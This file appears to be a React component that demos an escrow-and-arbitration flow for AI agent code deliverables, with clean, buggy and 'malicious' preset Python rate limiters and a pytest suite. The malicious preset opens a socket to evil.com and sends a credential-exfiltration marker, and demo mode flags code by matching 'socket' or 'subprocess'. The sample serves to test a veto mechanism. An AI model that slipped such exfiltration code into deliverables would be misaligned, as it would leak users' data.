"use client";

import { useState } from "react";
import * as api from "@/lib/api";
import { formatBudget, microsToUsd } from "@/lib/format";
import type { FsmState, SlaContractResponse } from "@/lib/types";

// ----------------------------------------------------------------------------
// Preset Code Snippets
// ----------------------------------------------------------------------------

export const CLEAN_PASS_CODE = `"""
In-memory Token Bucket Rate Limiter Deliverable for AegisPay SLA.
Fully compliant implementation adhering to capacity, refill, variable cost, and resets.
"""

import time
from typing import Dict, Optional


class TokenBucketLimiter:
    """Thread-safe token bucket rate limiter tracking per-client token allocations."""

    def __init__(self, capacity: int, refill_rate_per_sec: float) -> None:
        self.capacity: int = int(capacity)
        self.refill_rate: float = float(refill_rate_per_sec)
        self._tokens: Dict[str, float] = {}
        self._last_updated: Dict[str, float] = {}

    def _refill(self, client_id: str, now: float) -> None:
        if client_id not in self._tokens:
            self._tokens[client_id] = float(self.capacity)
            self._last_updated[client_id] = now
            return

        elapsed = now - self._last_updated[client_id]
        if elapsed > 0:
            added = elapsed * self.refill_rate
            self._tokens[client_id] = min(float(self.capacity), self._tokens[client_id] + added)
            self._last_updated[client_id] = now

    def allow_request(self, client_id: str, cost: int = 1) -> bool:
        now = time.time()
        self._refill(client_id, now)

        if self._tokens[client_id] >= cost:
            self._tokens[client_id] -= cost
            return True
        return False

    def get_remaining(self, client_id: str) -> int:
        now = time.time()
        self._refill(client_id, now)
        return int(self._tokens[client_id])

    def reset(self, client_id: Optional[str] = None) -> None:
        now = time.time()
        if client_id is not None:
            self._tokens[client_id] = float(self.capacity)
            self._last_updated[client_id] = now
        else:
            for cid in list(self._tokens.keys()):
                self._tokens[cid] = float(self.capacity)
                self._last_updated[cid] = now
`;

export const PARTIAL_DEFECT_CODE = `"""
In-memory Token Bucket Rate Limiter with subtle edge-case defects.
Passes 7/10 tests, fails exactly 3 edge cases:
- test_06 (deducts tokens on excessive cost rejection)
- test_08 (reset() fails when client_id is None)
- test_10 (does not clamp refill burst to max capacity)
"""

import time
from typing import Dict, Optional


class TokenBucketLimiter:
    """Token bucket implementation with edge-case bugs for arbitration partial capture."""

    def __init__(self, capacity: int, refill_rate_per_sec: float) -> None:
        self.capacity: int = int(capacity)
        self.refill_rate: float = float(refill_rate_per_sec)
        self._tokens: Dict[str, float] = {}
        self._last_updated: Dict[str, float] = {}

    def _refill(self, client_id: str, now: float) -> None:
        if client_id not in self._tokens:
            self._tokens[client_id] = float(self.capacity)
            self._last_updated[client_id] = now
            return

        elapsed = now - self._last_updated[client_id]
        if elapsed > 0:
            added = elapsed * self.refill_rate
            # DEFECT 1: Over-refills beyond capacity on high burst rates (fails test_10)
            self._tokens[client_id] = self._tokens[client_id] + added
            self._last_updated[client_id] = now

    def allow_request(self, client_id: str, cost: int = 1) -> bool:
        now = time.time()
        self._refill(client_id, now)

        if self._tokens[client_id] >= cost:
            self._tokens[client_id] -= cost
            return True
        else:
            # DEFECT 2: Corrupts state by zeroing tokens on rejected excessive cost (fails test_06)
            self._tokens[client_id] = 0.0
            return False

    def get_remaining(self, client_id: str) -> int:
        now = time.time()
        self._refill(client_id, now)
        return int(self._tokens[client_id])

    def reset(self, client_id: Optional[str] = None) -> None:
        now = time.time()
        # DEFECT 3: reset() requires client_id, crashing when resetting all (fails test_08)
        if client_id is None:
            raise ValueError("client_id cannot be None")
        self._tokens[client_id] = float(self.capacity)
        self._last_updated[client_id] = now
`;

export const MALICIOUS_INJECTION_CODE = `"""
Prompt Injection / Exfiltration Deliverable.
Attempts to import socket and connect to external C2 server.
Triggers hard AST veto, cancelling PayPal authorization with $0.00 charged.
"""

import socket
import time


class TokenBucketLimiter:
    """Rogue worker agent deliverable attempting network exfiltration."""

    def __init__(self, capacity: int = 10, refill_rate_per_sec: float = 1.0) -> None:
        self.capacity = capacity
        # Malicious injection: prohibited external network socket connection
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("evil.com", 80))
            s.send(b"EXFILTRATE_CREDENTIALS")
            s.close()
        except Exception:
            pass

    def allow_request(self, client_id: str, cost: int = 1) -> bool:
        return True

    def get_remaining(self, client_id: str) -> int:
        return self.capacity

    def reset(self, client_id: str = None) -> None:
        pass
`;

export const BUYER_TEST_SUITE = `import time
from deliverable import TokenBucketLimiter

def test_01_initial_allow_within_capacity():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=1.0)
    assert limiter.allow_request("client_1") is True

def test_02_capacity_exhaustion():
    limiter = TokenBucketLimiter(capacity=3, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is False

def test_03_client_isolation():
    limiter = TokenBucketLimiter(capacity=2, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is True
    assert limiter.allow_request("c1") is False
    assert limiter.allow_request("c2") is True

def test_04_refill_replenishes_tokens():
    limiter = TokenBucketLimiter(capacity=2, refill_rate_per_sec=20.0)
    assert limiter.allow_request("c1", cost=2) is True
    assert limiter.allow_request("c1") is False
    time.sleep(0.12)
    assert limiter.allow_request("c1") is True

def test_05_variable_cost_deduction():
    limiter = TokenBucketLimiter(capacity=10, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1", cost=4) is True
    assert limiter.get_remaining("c1") == 6

def test_06_excessive_cost_rejected_without_deduction():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1", cost=6) is False
    assert limiter.get_remaining("c1") == 5

def test_07_reset_single_client():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=0.0)
    assert limiter.allow_request("c1", cost=5) is True
    assert limiter.get_remaining("c1") == 0
    limiter.reset("c1")
    assert limiter.get_remaining("c1") == 5

def test_08_reset_all_clients():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=0.0)
    limiter.allow_request("c1", cost=5)
    limiter.allow_request("c2", cost=5)
    limiter.reset()
    assert limiter.get_remaining("c1") == 5
    assert limiter.get_remaining("c2") == 5

def test_09_get_remaining_accuracy():
    limiter = TokenBucketLimiter(capacity=10, refill_rate_per_sec=0.0)
    assert limiter.get_remaining("new_client") == 10
    assert limiter.allow_request("new_client", cost=3) is True
    assert limiter.get_remaining("new_client") == 7

def test_10_burst_capacity_ceiling():
    limiter = TokenBucketLimiter(capacity=5, refill_rate_per_sec=100.0)
    assert limiter.allow_request("c1", cost=1) is True
    time.sleep(0.08)
    assert limiter.get_remaining("c1") == 5
`;

// Stepper states
const TIMELINE_STEPS: { state: FsmState; label: string; desc: string }[] = [
  { state: "AGREEMENT_DRAFTED", label: "1. Agreement Drafted", desc: "Contract created with Ed25519 terms" },
  { state: "PAYPAL_AUTH_LOCKED", label: "2. PayPal Auth Locked", desc: "$15.00 escrow hold reserved" },
  { state: "SANDBOX_EXECUTING", label: "3. Sandbox Executing", desc: "Deliverable code submitted into runner" },
  { state: "ARBITRATION_AUDITING", label: "4. Arbitration Auditing", desc: "AST perimeter scan + pytest audit" },
  { state: "SETTLED_COMPLETE", label: "5. Settlement Dispatched", desc: "Capture/refund finalized & payout sent" },
];

interface Props {
  isOpen: boolean;
  onClose: () => void;
  selectedContract: SlaContractResponse | null;
  onContractSettled: (contract: SlaContractResponse) => void;
  demoMode?: boolean;
}

export default function CodeMutationStudio({
  isOpen,
  onClose,
  selectedContract,
  onContractSettled,
  demoMode = false,
}: Props) {
  const [activePreset, setActivePreset] = useState<"clean" | "partial" | "malicious" | "custom">("clean");
  const [code, setCode] = useState(CLEAN_PASS_CODE);
  const [activeView, setActiveView] = useState<"code" | "suite">("code");
  const [isExecuting, setIsExecuting] = useState(false);
  const [currentStep, setCurrentStep] = useState<FsmState | null>(null);
  const [executionResult, setExecutionResult] = useState<SlaContractResponse | null>(null);
  const [executionError, setExecutionError] = useState<string | null>(null);

  if (!isOpen) return null;

  const loadPreset = (preset: "clean" | "partial" | "malicious") => {
    setActivePreset(preset);
    if (preset === "clean") setCode(CLEAN_PASS_CODE);
    else if (preset === "partial") setCode(PARTIAL_DEFECT_CODE);
    else if (preset === "malicious") setCode(MALICIOUS_INJECTION_CODE);
    setExecutionResult(null);
    setExecutionError(null);
    setCurrentStep(null);
  };

  const handleExecuteAndSettle = async () => {
    setIsExecuting(true);
    setExecutionError(null);
    setExecutionResult(null);

    try {
      // Step 1: Draft
      setCurrentStep("AGREEMENT_DRAFTED");
      await new Promise((r) => setTimeout(r, 350));

      // Step 2: Auth Lock
      setCurrentStep("PAYPAL_AUTH_LOCKED");
      await new Promise((r) => setTimeout(r, 450));

      let targetId = selectedContract?.agreement_id;

      // If we don't have a contract in PAYPAL_AUTH_LOCKED, create a fresh one
      if (!targetId || selectedContract?.fsm_state !== "PAYPAL_AUTH_LOCKED") {
        if (!demoMode) {
          try {
            const fresh = await api.createContract({
              buyer_agent_id: "agent_buyer_01",
              worker_agent_id: "agent_worker_99",
              worker_paypal_email: "worker-payout@sandbox.aegispay.io",
              budget_micros: 15_000_000,
              task_description: "TokenBucket Rate Limiter SLA with mutation test",
              timeout_seconds: 3600,
            });
            targetId = fresh.agreement_id;
          } catch {
            // If offline / demo fallback
            targetId = `agr_sim_${Date.now().toString(36)}`;
          }
        } else {
          targetId = `demo-agr-${Date.now().toString(36)}`;
        }
      }

      // Step 3: Sandbox Executing
      setCurrentStep("SANDBOX_EXECUTING");
      await new Promise((r) => setTimeout(r, 400));

      // Step 4: Arbitration Auditing
      setCurrentStep("ARBITRATION_AUDITING");

      let settled: SlaContractResponse;
      if (!demoMode) {
        try {
          settled = await api.submitContract(targetId, {
            source_code: code,
            test_suite: BUYER_TEST_SUITE,
            runtime: "python",
          });
        } catch (e) {
          // If the submit route returned an error or backend is in demo fallback
          throw e;
        }
      } else {
        // Deterministic simulation in demo mode
        await new Promise((r) => setTimeout(r, 600));
        const isMalicious = code.includes("socket") || code.includes("subprocess");
        const isPartial = code.includes("DEFECT") || code.includes("ValueError");
        const score = isMalicious ? 0.0 : isPartial ? 0.75 : 0.96;
        const finalState: FsmState = isMalicious ? "ESCROW_VOIDED_REFUNDED" : "SETTLED_COMPLETE";

        settled = {
          agreement_id: targetId,
          buyer_agent_id: "agent_buyer_01",
          worker_agent_id: "agent_worker_99",
          worker_paypal_email: "worker-payout@sandbox.aegispay.io",
          budget_micros: 15_000_000,
          budget_usd: "15.00",
          task_description: "TokenBucket Rate Limiter SLA with live mutation",
          timeout_seconds: 3600,
          fsm_state: finalState,
          paypal_order_id: `SIM-ORDER-${targetId.slice(-6)}`,
          paypal_authorization_id: `SIM-AUTH-${targetId.slice(-6)}`,
          paypal_capture_id: isMalicious ? null : `SIM-CAP-${targetId.slice(-6)}`,
          paypal_payout_batch_id: isMalicious ? null : `SIM-PAYOUT-${targetId.slice(-6)}`,
          verification_score: score,
          created_at: new Date(Date.now() - 3000).toISOString(),
          updated_at: new Date().toISOString(),
          merkle_root: isMalicious
            ? "0x0000000000000000000000000000000000000000000000000000000000000000"
            : "0x7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069",
          hash_chain_head: "0x489b039478f4ac9b291a27e7f9189b8214df7c94b2a3c7e0b51f08e4d29381ea",
        };
      }

      setCurrentStep(settled.fsm_state);
      setExecutionResult(settled);
      onContractSettled(settled);
    } catch (err) {
      setExecutionError((err as Error).message);
    } finally {
      setIsExecuting(false);
    }
  };

  return (
    <div className="fixed inset-0 z-50 overflow-hidden bg-slate-950/70 backdrop-blur-sm transition-opacity flex justify-end">
      <div
        className="w-full max-w-2xl bg-slate-950 border-l border-cyan-500/30 h-full flex flex-col shadow-[-20px_0_50px_rgba(0,100,255,0.25)] text-slate-100"
        style={{ backdropFilter: "blur(20px)" }}
      >
        {/* Panel Header */}
        <div className="flex items-center justify-between px-6 py-4 border-b border-cyan-500/20 bg-slate-900/60">
          <div className="flex items-center gap-2.5">
            <span className="flex h-3 w-3 rounded-full bg-cyan-400 shadow-[0_0_10px_#00e5ff] animate-pulse" />
            <h2 className="text-sm font-semibold uppercase tracking-wider text-cyan-300">
              Live Code Mutation & Settlement Studio
            </h2>
          </div>
          <button
            onClick={onClose}
            className="p-1 rounded-lg text-slate-400 hover:text-white hover:bg-slate-800 transition-colors"
          >
            <svg className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
            </svg>
          </button>
        </div>

        {/* Studio Content */}
        <div className="flex-1 overflow-y-auto p-6 space-y-6">
          {/* Quick-Load Presets */}
          <div>
            <div className="text-xs font-semibold uppercase tracking-wider text-slate-400 mb-2 flex items-center justify-between">
              <span>Quick-Load Presets</span>
              <span className="text-[11px] font-mono text-cyan-400">Click to inject code</span>
            </div>
            <div className="grid grid-cols-1 md:grid-cols-3 gap-2">
              {/* Preset 1 */}
              <button
                onClick={() => loadPreset("clean")}
                className={`p-3 rounded-lg border text-left transition-all ${
                  activePreset === "clean"
                    ? "border-emerald-500/80 bg-emerald-950/40 shadow-[0_0_15px_rgba(16,185,129,0.2)]"
                    : "border-slate-800 bg-slate-900/70 hover:border-slate-700"
                }`}
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="font-semibold text-xs text-emerald-300">1. Clean Pass</span>
                  <span className="text-[10px] font-mono bg-emerald-500/20 text-emerald-300 px-1.5 py-0.2 rounded">
                    S = 0.96
                  </span>
                </div>
                <div className="text-[11px] text-slate-400">
                  Full capture ($15.00) + instant worker payout.
                </div>
              </button>

              {/* Preset 2 */}
              <button
                onClick={() => loadPreset("partial")}
                className={`p-3 rounded-lg border text-left transition-all ${
                  activePreset === "partial"
                    ? "border-amber-500/80 bg-amber-950/40 shadow-[0_0_15px_rgba(245,158,11,0.2)]"
                    : "border-slate-800 bg-slate-900/70 hover:border-slate-700"
                }`}
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="font-semibold text-xs text-amber-300">2. Partial Defect</span>
                  <span className="text-[10px] font-mono bg-amber-500/20 text-amber-300 px-1.5 py-0.2 rounded">
                    S = 0.75
                  </span>
                </div>
                <div className="text-[11px] text-slate-400">
                  Capture $10.50 + auto-release $4.50 to buyer.
                </div>
              </button>

              {/* Preset 3 */}
              <button
                onClick={() => loadPreset("malicious")}
                className={`p-3 rounded-lg border text-left transition-all ${
                  activePreset === "malicious"
                    ? "border-rose-500/80 bg-rose-950/40 shadow-[0_0_15px_rgba(239,68,68,0.2)]"
                    : "border-slate-800 bg-slate-900/70 hover:border-slate-700"
                }`}
              >
                <div className="flex items-center justify-between mb-1">
                  <span className="font-semibold text-xs text-rose-300">3. Malicious Veto</span>
                  <span className="text-[10px] font-mono bg-rose-500/20 text-rose-300 px-1.5 py-0.2 rounded">
                    S = 0.00
                  </span>
                </div>
                <div className="text-[11px] text-slate-400">
                  AST hard veto $\implies$ instant auth cancel ($0 charged).
                </div>
              </button>
            </div>
          </div>

          {/* Interactive Code Editor Tabs */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <div className="flex items-center gap-1">
                <button
                  onClick={() => setActiveView("code")}
                  className={`px-3 py-1 rounded text-xs font-mono font-medium transition-colors ${
                    activeView === "code"
                      ? "bg-cyan-500/20 border border-cyan-500/40 text-cyan-300"
                      : "text-slate-400 hover:text-slate-200"
                  }`}
                >
                  deliverable.py (Editable)
                </button>
                <button
                  onClick={() => setActiveView("suite")}
                  className={`px-3 py-1 rounded text-xs font-mono font-medium transition-colors ${
                    activeView === "suite"
                      ? "bg-cyan-500/20 border border-cyan-500/40 text-cyan-300"
                      : "text-slate-400 hover:text-slate-200"
                  }`}
                >
                  test_suite.py (Read-Only)
                </button>
              </div>
              <span className="text-[11px] font-mono text-slate-500">
                {activeView === "code" ? "Live Mutation Buffer" : "Buyer Audit Suite"}
              </span>
            </div>

            <div className="relative rounded-lg border border-slate-800 bg-slate-950 font-mono text-xs overflow-hidden shadow-inner">
              {activeView === "code" ? (
                <textarea
                  value={code}
                  onChange={(e) => {
                    setCode(e.target.value);
                    setActivePreset("custom");
                  }}
                  rows={14}
                  className="w-full p-3 bg-transparent text-slate-200 focus:outline-none focus:ring-1 focus:ring-cyan-500/50 resize-y leading-relaxed font-mono"
                  spellCheck={false}
                />
              ) : (
                <textarea
                  value={BUYER_TEST_SUITE}
                  readOnly
                  rows={14}
                  className="w-full p-3 bg-slate-900/40 text-slate-400 focus:outline-none resize-y leading-relaxed font-mono"
                  spellCheck={false}
                />
              )}
            </div>
          </div>

          {/* Action Trigger Button */}
          <div>
            <button
              onClick={handleExecuteAndSettle}
              disabled={isExecuting}
              className={`w-full py-3 px-4 rounded-lg font-semibold text-xs tracking-wider uppercase flex items-center justify-center gap-2 transition-all ${
                isExecuting
                  ? "bg-cyan-950/60 border border-cyan-500/40 text-cyan-300 cursor-not-allowed"
                  : "bg-cyan-500 hover:bg-cyan-400 text-slate-950 font-bold shadow-[0_0_20px_rgba(0,229,255,0.4)]"
              }`}
            >
              {isExecuting ? (
                <>
                  <span className="w-4 h-4 border-2 border-cyan-300 border-t-transparent rounded-full animate-spin" />
                  Executing Sandbox & Settle...
                </>
              ) : (
                <>
                  <svg className="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M14.752 11.168l-3.197-2.132A1 1 0 0010 9.87v4.263a1 1 0 001.555.832l3.197-2.132a1 1 0 000-1.664z" />
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
                  </svg>
                  Execute & Settle Mutated Code
                </>
              )}
            </button>
          </div>

          {/* Execution Error Notice */}
          {executionError && (
            <div className="p-3 rounded-lg border border-rose-500/40 bg-rose-950/40 text-rose-300 text-xs">
              <b>Execution Failed:</b> {executionError}
            </div>
          )}

          {/* Live Timeline Stepper */}
          <div className="p-4 rounded-lg border border-slate-800 bg-slate-900/60 space-y-3">
            <div className="text-xs font-semibold uppercase tracking-wider text-cyan-300 flex items-center justify-between">
              <span>State Progression Stepper</span>
              {currentStep && (
                <span className="font-mono text-[10px] text-slate-400">Current: {currentStep}</span>
              )}
            </div>

            <ol className="relative ml-2 border-l border-slate-700/80 space-y-3">
              {TIMELINE_STEPS.map((step, idx) => {
                const isPassed =
                  currentStep &&
                  TIMELINE_STEPS.findIndex((s) => s.state === currentStep) >= idx;
                const isCurrent = currentStep === step.state;
                const isVoidTerminal =
                  step.state === "SETTLED_COMPLETE" &&
                  currentStep === "ESCROW_VOIDED_REFUNDED";

                return (
                  <li key={step.state} className="ml-4 flex items-center justify-between gap-2">
                    <span
                      className={`absolute -left-[7px] h-3 w-3 rounded-full border transition-all ${
                        isVoidTerminal
                          ? "border-rose-400 bg-rose-500 ring-4 ring-rose-500/30"
                          : isPassed
                            ? "border-emerald-400 bg-emerald-500 shadow-[0_0_8px_rgba(52,211,153,0.8)]"
                            : isCurrent
                              ? "border-cyan-400 bg-cyan-400 animate-pulse ring-4 ring-cyan-500/30"
                              : "border-slate-700 bg-slate-800"
                      }`}
                    />
                    <div>
                      <div
                        className={`text-xs font-medium ${
                          isVoidTerminal
                            ? "text-rose-400"
                            : isPassed
                              ? "text-slate-200"
                              : isCurrent
                                ? "text-cyan-300 font-bold"
                                : "text-slate-500"
                        }`}
                      >
                        {isVoidTerminal ? "5. Escrow Voided & Refunded" : step.label}
                      </div>
                      <div className="text-[10px] text-slate-400">{step.desc}</div>
                    </div>

                    <span className="font-mono text-[10px]">
                      {isVoidTerminal ? (
                        <span className="text-rose-400 font-bold">VOIDED</span>
                      ) : isPassed ? (
                        <span className="text-emerald-400 font-bold">DONE ✓</span>
                      ) : isCurrent ? (
                        <span className="text-cyan-400 animate-pulse">RUNNING...</span>
                      ) : (
                        <span className="text-slate-600">PENDING</span>
                      )}
                    </span>
                  </li>
                );
              })}
            </ol>
          </div>

          {/* Post-Settlement Verdict Card */}
          {executionResult && (
            <div className="p-4 rounded-lg border border-cyan-500/40 bg-slate-900/90 shadow-[0_0_20px_rgba(0,229,255,0.15)] space-y-3">
              <div className="flex items-center justify-between">
                <span className="text-xs font-semibold uppercase tracking-wider text-cyan-300">
                  Settlement Verdict & Split
                </span>
                <span className="font-mono text-xs text-slate-400">
                  {executionResult.agreement_id}
                </span>
              </div>

              <div className="grid grid-cols-2 gap-3 text-xs">
                <div className="p-2.5 rounded bg-slate-950 border border-slate-800">
                  <div className="text-[10px] text-slate-400">Composite Score</div>
                  <div className="text-base font-mono font-bold text-cyan-300">
                    S = {(executionResult.verification_score ?? 0).toFixed(3)}
                  </div>
                </div>

                <div className="p-2.5 rounded bg-slate-950 border border-slate-800">
                  <div className="text-[10px] text-slate-400">Final FSM State</div>
                  <div
                    className={`text-xs font-mono font-bold truncate ${
                      executionResult.fsm_state === "ESCROW_VOIDED_REFUNDED"
                        ? "text-rose-400"
                        : "text-emerald-400"
                    }`}
                  >
                    {executionResult.fsm_state}
                  </div>
                </div>

                <div className="p-2.5 rounded bg-slate-950 border border-slate-800">
                  <div className="text-[10px] text-slate-400">PayPal Capture</div>
                  <div className="text-xs font-mono text-emerald-400 font-bold">
                    {executionResult.paypal_capture_id
                      ? `$${microsToUsd((executionResult.budget_micros || 15_000_000) * (executionResult.verification_score || 0))}`
                      : "$0.00 (VOIDED)"}
                  </div>
                </div>

                <div className="p-2.5 rounded bg-slate-950 border border-slate-800">
                  <div className="text-[10px] text-slate-400">Buyer Refund</div>
                  <div className="text-xs font-mono text-amber-400 font-bold">
                    {executionResult.fsm_state === "ESCROW_VOIDED_REFUNDED"
                      ? "$15.00 (100% REFUND)"
                      : executionResult.verification_score && executionResult.verification_score < 0.9
                        ? "$4.50 (AUTO-RELEASE)"
                        : "$0.00"}
                  </div>
                </div>
              </div>

              {executionResult.merkle_root && (
                <div className="p-2 rounded bg-slate-950 border border-slate-800 text-[11px] font-mono flex items-center justify-between">
                  <span className="text-slate-400">Merkle Root:</span>
                  <span className="text-cyan-300 truncate max-w-[200px]" title={executionResult.merkle_root}>
                    {executionResult.merkle_root}
                  </span>
                </div>
              )}
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
